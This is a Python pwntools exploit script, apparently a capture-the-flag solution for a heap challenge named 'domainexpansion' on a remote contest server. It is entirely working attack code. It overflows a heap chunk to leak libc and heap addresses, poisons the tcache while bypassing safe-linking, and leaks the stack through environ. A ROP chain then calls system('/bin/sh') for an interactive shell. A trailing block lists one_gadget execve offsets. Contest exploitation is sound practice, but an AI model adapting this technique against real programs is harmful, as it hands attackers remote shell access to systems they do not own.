#!/usr/bin/python3

from pwn import *

exe = ELF('domainexpansion_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1522

        c
        ''')
        input()


if args.REMOTE:
    p = remote('vsc.tf', 7001)
else:
    p = process(exe.path)


def cr(idx, sz):
    sla(b'choice: ', '1')
    sla(b'index: ', str(idx))
    sla(b'size: ', str(sz))


def ed(idx, data):
    sla(b'choice: ', '2')
    sla(b'index: ', str(idx))
    sla(b'data: ', data)


def pr(idx):
    sla(b'choice: ', '3')
    sla(b'index: ', str(idx))


def de(idx):
    sla(b'choice: ', '4')
    sla(b'index: ', str(idx))


def exp(idx, sz):
    sla(b'choice: ', '260')
    sla(b'index: ', str(idx))
    sla(b'size: ', str(sz))


# leak libc
cr(0, 0x100)
cr(1, 0x500)
cr(2, 0x20)
de(1)
exp(0, 0x500)
ed(0, b'a'*0x110)
pr(0)
p.recvuntil(b'a'*0x110)
libc.address = u64(p.recv(6) + b'\0\0') - 0x21ace0
info("libc.address " + hex(libc.address))
# leak heap
ed(0, b'a'*0x100 + flat(0, 0x511))
cr(3, 0x100)
de(3)
ed(0, b'a'*0x110)
pr(0)
p.recvuntil(b'a'*0x110)
heap = u64(p.recvline(keepends=False).ljust(8, b'\0')) << 12
info("heap " + hex(heap))
ed(0, b'a'*0x100 + flat(0, 0x111))
# UAF leak stack
cr(3, 0x100)
cr(4, 0x100)
de(4)
de(3)
ed(0, b'a'*0x100 + flat(0, 0x111, ((heap + 0x3b0) >> 12) ^ (libc.sym.environ)))
cr(4, 0x100)
cr(3, 0x100)
pr(3)
p.recvuntil(b'Data: ')
stack = u64(p.recvline(keepends=False).ljust(8, b'\0'))
info("stack " + hex(stack))
# rop
cr(5, 0x100)
de(5)
de(4)
GDB()
ed(0, b'a'*0x100 + flat(0, 0x111, ((heap + 0x3b0) >> 12) ^ (stack-0x128)))
cr(5, 0x100)
cr(4, 0x100)
pop_rdi = 0x000000000002a3e5 + libc.address

ed(4, flat(0, pop_rdi+1, pop_rdi, next(libc.search(b'/bin/sh')), libc.sym.system))
sla(b'choice: ', '5')

p.interactive()
'''
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

'''
